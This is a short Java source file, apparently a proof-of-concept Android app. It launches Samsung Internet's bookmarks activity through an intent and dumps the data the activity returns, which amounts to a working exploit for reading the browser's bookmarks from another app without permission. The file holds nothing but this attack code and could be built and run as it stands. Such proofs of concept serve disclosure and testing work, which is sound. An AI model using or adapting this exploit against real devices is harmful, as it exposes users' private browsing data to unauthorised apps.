package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent i = new Intent("com.sec.android.app.sbrowser.bookmarksDb.ui.ShowBookmarksActivity");
        startActivityForResult(i, 0);
    }

    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);

        DumpUtils.dump(data, getClassLoader());
    }
}